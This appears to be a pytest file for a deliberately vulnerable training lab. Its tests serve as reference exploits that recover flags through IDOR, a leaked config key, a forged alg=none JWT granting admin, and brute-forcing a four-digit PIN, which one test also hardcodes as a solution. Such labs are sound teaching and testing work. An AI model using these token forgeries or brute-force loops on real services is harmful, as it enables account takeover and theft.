"""These tests *are* the reference exploits: each recovers a flag from the
vulnerable server and submits it to the scoreboard. If they pass, the lab and
its writeups are consistent."""

import base64
import json

from dvmobile.vulnserver import handle
from dvmobile.scoring import Scoreboard
from dvmobile.challenges import BY_ID


def _b64url(obj) -> str:
    return base64.urlsafe_b64encode(json.dumps(obj).encode()).decode().rstrip("=")


def test_idor_profile():
    status, body = handle("GET", "/api/users/2/profile", {}, b"")
    assert status == 200
    assert body["note"] == BY_ID["idor-profile"].flag


def test_config_leak():
    status, body = handle("GET", "/api/config", {}, b"")
    assert status == 200
    assert body["analytics_key"] == BY_ID["config-leak"].flag


def test_jwt_none_admin_takeover():
    # forge a token with alg=none and role=admin; server decodes unverified
    token = f"{_b64url({'alg': 'none', 'typ': 'JWT'})}.{_b64url({'sub': 'attacker', 'role': 'admin'})}."
    status, body = handle("GET", "/api/admin", {"authorization": f"Bearer {token}"}, b"")
    assert status == 200
    assert body["secret"] == BY_ID["jwt-none"].flag


def test_admin_denied_for_user_role():
    token = f"{_b64url({'alg': 'none'})}.{_b64url({'role': 'user'})}."
    status, _ = handle("GET", "/api/admin", {"authorization": f"Bearer {token}"}, b"")
    assert status == 403


def test_weak_pin_bruteforce():
    found = None
    for pin in range(10000):
        status, body = handle("POST", "/api/transfer", {}, json.dumps({"pin": f"{pin:04d}"}).encode())
        if status == 200:
            found = body["flag"]
            break
    assert found == BY_ID["weak-pin"].flag


def test_unknown_route_404():
    status, _ = handle("GET", "/api/nope", {}, b"")
    assert status == 404


def test_scoreboard_full_solve(tmp_path):
    board = Scoreboard(str(tmp_path / "score.json"))
    assert board.score == 0
    # recover every flag the intended way and submit
    flags = {
        "idor-profile": handle("GET", "/api/users/2/profile", {}, b"")[1]["note"],
        "config-leak": handle("GET", "/api/config", {}, b"")[1]["analytics_key"],
    }
    token = f"{_b64url({'alg': 'none'})}.{_b64url({'role': 'admin'})}."
    flags["jwt-none"] = handle("GET", "/api/admin", {"authorization": f"Bearer {token}"}, b"")[1]["secret"]
    flags["weak-pin"] = handle("POST", "/api/transfer", {}, b'{"pin":"4271"}')[1]["flag"]
    for cid, flag in flags.items():
        assert board.submit(cid, flag) is True
    assert board.progress() == "4/4 solved"


def test_wrong_flag_rejected(tmp_path):
    board = Scoreboard(str(tmp_path / "s.json"))
    assert board.submit("idor-profile", "DVM{nope}") is False
    assert board.score == 0


def test_scoreboard_persists(tmp_path):
    path = str(tmp_path / "s.json")
    Scoreboard(path).submit("config-leak", BY_ID["config-leak"].flag)
    assert Scoreboard(path).solved.get("config-leak") is True
